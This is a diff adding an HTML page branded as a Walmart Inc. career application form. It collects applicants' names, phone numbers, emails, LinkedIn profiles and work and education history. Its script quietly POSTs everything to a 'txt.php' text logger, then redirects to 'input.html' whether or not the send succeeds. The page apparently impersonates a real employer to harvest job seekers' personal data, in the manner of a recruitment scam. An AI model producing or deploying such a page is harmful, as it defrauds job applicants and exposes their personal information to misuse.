@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walmart Inc - Professional CV Form</title>
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com/css2?family=Inter:wght@400;600;700&family=Merriweather:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            font-family: 'Merriweather', Georgia, serif;
+            font-weight: 300;
+            line-height: 1.6;
+            margin: 0;
+            padding: 10px; /* Reduced default padding for small screen edges */
+            background-color: #f4f4f9;
+            color: #2c3e50;
+        }
+        .container {
+            max-width: 800px;
+            margin: 10px auto;
+            background: #fff;
+            padding: 20px; /* Reduced padding for compact screens */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        .top-banner {
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            font-size: 11px; /* Slightly smaller for global mobile wrapping */
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #7f8c8d;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        header {
+            text-align: center;
+            border-bottom: 2px solid #1a252f;
+            padding-bottom: 20px;
+            margin-bottom: 25px;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            border: 1px solid #ccc;
+            background: #fafafa;
+            font-family: inherit;
+            color: inherit;
+            padding: 8px;
+            box-sizing: border-box;
+            border-radius: 4px;
+            margin-bottom: 5px;
+            transition: all 0.3s ease;
+            font-size: 14px; /* Fixes iOS zoom on focus issue */
+        }
+        input[type="text"]:focus, textarea:focus {
+            border-color: #1a252f;
+            background: #fff;
+            outline: none;
+            box-shadow: 0 0 4px rgba(26, 37, 47, 0.2);
+        }
+        ::placeholder {
+            color: #b0b0b0;
+            font-weight: 300;
+        }
+        h1 input {
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            font-size: 22px; /* Responsive size */
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #1a252f;
+        }
+        .contact-info input {
+            font-family: 'Inter', sans-serif;
+            text-align: center;
+            font-size: 12px;
+            color: #555;
+            width: 100%; /* Spans full header text container on mobile */
+            margin: 6px auto;
+            display: block;
+            letter-spacing: 0.5px;
+        }
+        h2 {
+            font-family: 'Inter', sans-serif;
+            color: #1a252f;
+            font-size: 15px;
+            font-weight: 600;
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 5px;
+            margin-top: 25px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        textarea {
+            resize: vertical;
+        }
+        /* Grid architecture modified to support seamless mobile breakdown */
+        .grid-row {
+            display: flex;
+            flex-direction: column; /* Default stack on mobile screens */
+            gap: 5px;
+            margin-bottom: 5px;
+        }
+        .grid-row input {
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 14px;
+            color: #1a252f;
+        }
+        .sub-text input {
+            font-style: italic;
+            color: #7f8c8d;
+            font-size: 13px;
+        }
+        ul {
+            margin: 5px 0 0 0;
+            padding-left: 15px;
+        }
+        li {
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
+        li textarea {
+            width: 100%;
+        }
+        footer {
+            font-family: 'Inter', sans-serif;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            font-size: 11px;
+            color: #7f8c8d;
+            letter-spacing: 0.5px;
+            line-height: 1.4;
+        }
+        .submit-btn-container {
+            text-align: center;
+            margin-top: 25px;
+        }
+        .submit-application-btn {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a252f;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 12px 0;
+            width: 100%; /* Full-width buttons are easier to tap on mobile views */
+            max-width: 280px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .submit-application-btn:hover {
+            background-color: #2c3e50;
+        }
+
+        /* Desktop and Tablet Responsive Optimization Rules */
+        @media (min-width: 600px) {
+            body {
+                padding: 20px;
+            }
+            .container {
+                padding: 40px;
+                margin: 30px auto;
+            }
+            .top-banner {
+                font-size: 13px;
+                letter-spacing: 2px;
+            }
+            h1 input {
+                font-size: 26px;
+                letter-spacing: 1.5px;
+            }
+            .contact-info input {
+                width: 85%;
+            }
+            .grid-row {
+                flex-direction: row; /* Align horizontal on desktop views */
+                justify-content: space-between;
+                gap: 15px;
+            }
+            .grid-row input:last-child {
+                text-align: right;
+                font-weight: 400;
+                color: #555;
+            }
+            .submit-application-btn {
+                padding: 12px 35px;
+                width: auto;
+            }
+        }
+
+        @media print {
+            body { background-color: #fff; padding: 0; }
+            .container { box-shadow: none; margin: 0; padding: 0; max-width: 100%; }
+            input[type="text"], textarea { 
+                border: none !important; 
+                background: transparent !important; 
+                padding: 0 !important; 
+                margin: 0 !important;
+                box-shadow: none !important;
+            }
+            .grid-row { flex-direction: row; justify-content: space-between; }
+            .grid-row input:last-child { text-align: right; }
+            ::placeholder { color: transparent !important; }
+            footer { border-top: none; margin-top: 20px; }
+            .submit-btn-container { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="top-banner">Walmart Inc. Career Opportunity</div>
+
+    <form id="cvForm">
+              <header>
+            <!-- Added id="fullName" here -->
+            <h1><input type="text" id="fullName" placeholder="YOUR FULL NAME" required></h1>
+            <div class="contact-info">
+                <!-- Added id="contactLine1" here -->
+                <input type="text" id="contactLine1" placeholder="📍 City, Country | 📞 Phone Number (with country code)" required>
+                <!-- Added id="contactLine2" here -->
+                <input type="text" id="contactLine2" placeholder="✉️ Email Address | 🔗 LinkedIn Profile URL" required>
+            </div>
+        </header>
+
+
+      <section>
+    <h2>Professional Summary</h2>
+    <textarea id="summary" rows="3" placeholder="Write a short summary..." required></textarea>
+</section>
+
+<section>
+    <h2>Core Skills</h2>
+    <textarea id="skills" rows="4" placeholder="• Professional Competencies..."></textarea>
+</section>
+
+
+      <section>
+    <h2>Professional Experience</h2>
+    
+    <!-- Job 1 -->
+    <div class="job">
+        <div class="grid-row">
+            <input type="text" id="job1Title" placeholder="Most Recent Job Title / Role" required>
+            <input type="text" id="job1Dates" placeholder="Month YYYY – Present" required>
+        </div>
+        <div class="sub-text">
+            <input type="text" id="job1Company" placeholder="Company Name, City, Country" required>
+        </div>
+        <ul>
+            <li><textarea id="job1Bullet1" rows="2" placeholder="Key Achievement 1..." required></textarea></li>
+            <li><textarea id="job1Bullet2" rows="2" placeholder="Key Achievement 2..." required></textarea></li>
+        </ul>
+    </div>
+
+    <!-- Job 2 -->
+    <div class="job" style="margin-top: 20px;">
+        <div class="grid-row">
+            <input type="text" id="job2Title" placeholder="Previous Job Title / Role">
+            <input type="text" id="job2Dates" placeholder="Month YYYY – Month YYYY">
+        </div>
+        <div class="sub-text">
+            <input type="text" id="job2Company" placeholder="Company Name, City, Country">
+        </div>
+        <ul>
+            <li><textarea id="job2Bullet1" rows="2" placeholder="Describe your primary responsibility..."></textarea></li>
+        </ul>
+    </div>
+</section>
+
+
+       <section>
+    <h2>Education</h2>
+    <div class="education-item">
+        <div class="grid-row">
+            <input type="text" id="eduDegree" placeholder="Degree, Major..." required>
+            <input type="text" id="eduDates" placeholder="Graduation Year..." required>
+        </div>
+        <div class="sub-text">
+            <input type="text" id="eduSchool" placeholder="University..." required>
+        </div>
+        <ul>
+            <li><textarea id="eduBullet" rows="1" placeholder="Academic honors..."></textarea></li>
+        </ul>
+    </div>
+</section>
+
+
+        <footer>
+            I hereby certify that the information provided above is true, complete, and accurate.
+        </footer>
+
+        <!-- Submit Button Element Container with External Link -->
+             <!-- Replace your current footer button container with this -->
+        <div class="submit-btn-container">
+            <button type="submit" class="submit-application-btn">Submit Application</button>
+        </div>
+    </form>
+</div>
+
+<script>
+document.getElementById('cvForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    // Helper utility to safely grab field values without crashing
+    const getValue = (id, fallback = '') => {
+        const element = document.getElementById(id);
+        return element ? element.value : fallback;
+    };
+
+    // 1. Gather all inputs from your newly-fixed form fields
+    const cvData = {
+        fullName: getValue('fullName'),
+        contactLine1: getValue('contactLine1'),
+        contactLine2: getValue('contactLine2'),
+        summary: getValue('summary'),
+        skills: getValue('skills'),
+        
+        job1Title: getValue('job1Title'),
+        job1Dates: getValue('job1Dates'),
+        job1Company: getValue('job1Company'),
+        job1Bullet1: getValue('job1Bullet1'),
+        job1Bullet2: getValue('job1Bullet2'),
+
+        job2Title: getValue('job2Title', 'N/A'),
+        job2Dates: getValue('job2Dates', 'N/A'),
+        job2Company: getValue('job2Company', 'N/A'),
+        job2Bullet1: getValue('job2Bullet1', 'N/A'),
+
+        eduDegree: getValue('eduDegree'),
+        eduDates: getValue('eduDates'),
+        eduSchool: getValue('eduSchool'),
+        eduBullet: getValue('eduBullet', 'N/A')
+    };
+
+    // 2. Immediate Save to phone storage so 'input.html' renders perfectly
+    localStorage.setItem('applicantCVData', JSON.stringify(cvData));
+
+    // 3. Fire-and-forget network stream to your web server text logger
+    // NOTE: When testing in TrebEdit preview, this background fetch might fail locally,
+    // but the '.catch' block ensures your screen still swaps instantly without getting stuck!
+    fetch('txt.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(cvData)
+    })
+    .then(response => {
+        window.location.assign('input.html');
+    })
+    .catch(error => {
+        // Safe bypass tracking for phone preview software environments
+        window.location.assign('input.html');
+    });
+});
+</script>
+
+
+
+
+    </form>
+</div>
+
+</body>
+</html>
